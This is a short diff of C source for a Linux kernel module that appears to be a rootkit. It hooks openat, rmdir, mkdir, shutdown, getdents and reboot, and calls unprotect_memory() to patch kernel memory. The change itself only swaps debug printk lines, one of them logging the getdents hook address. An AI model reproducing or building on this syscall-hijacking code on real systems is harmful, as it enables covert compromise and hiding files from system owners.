@@ -72,7 +72,6 @@ asmlinkage int hackers_reboot(int magic1,int magic2,int magic3, void* arg)
 }
 asmlinkage int my_openat(const struct pt_regs *regs){
 	const char __user *filename = (char *)regs->si;
-    printk("Project:a check");
     char dir_name[100] = {0};
     strncpy_from_user(dir_name, filename, 100);
      //printk("Project:Trying to access file with path: %s\n", dir_name);
@@ -141,6 +140,7 @@ static int __init start(void)
     printk("Project:rmdir @ 0x%lx\n", orig_rmdir);
     printk("Project:rmdir @ 0x%lx\n", orig_mkdir);
     printk("Project:shutdown @ 0x%lx\n", orig_shutdown);
+    printk("Project:getdents @ 0x%lx\n", orig_getdents);
     printk("Project:reboot @ 0x%lx\n", old_reboot_sys_call);
 
     unprotect_memory();
